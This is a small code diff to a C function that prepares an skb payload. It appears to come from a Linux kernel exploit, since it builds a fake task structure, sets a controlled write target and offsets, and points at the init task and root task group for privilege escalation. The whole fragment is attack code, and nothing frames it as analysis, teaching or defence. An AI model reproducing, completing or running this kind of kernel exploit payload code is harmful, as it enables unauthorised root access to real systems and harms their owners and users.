@@ -805,9 +805,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     pi_top_task = fake_task;
   }
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    write_pc = stage0_logger_addr();
+    write_pc = SLIDE_LOGGERS_0_1;
     write_right = 0;
-    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
+    write_left = SLIDE_RANDOM_BOOT_ID_DATA + 8;
     if (standalone_tcp_payload) {
       waiter_task = SLIDE_INIT_TASK;
       task_group = SLIDE_ROOT_TASK_GROUP;
